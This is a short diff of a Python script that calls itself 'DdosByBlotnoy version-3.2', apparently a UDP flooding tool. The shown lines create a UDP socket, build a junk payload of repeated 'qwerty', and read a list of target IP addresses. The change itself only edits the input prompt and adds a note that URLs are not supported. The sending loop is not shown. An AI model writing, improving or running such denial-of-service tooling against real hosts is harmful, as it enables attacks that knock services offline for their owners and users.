@@ -11,12 +11,14 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 print(Fore.GREEN)
 print("DdosByBlotnoy")
 print("version-3.2")
+print(Fore.RED + "Can't work on URL")
+print(Fore.GREEN)
 
 bytes = "qwerty"*2000
 sent = 0
 max = 1000
 
-ips = input("IP/URL : ")
+ips = input("IP : ")
 ips = (ips+",").split(",")
 ips.pop()
 
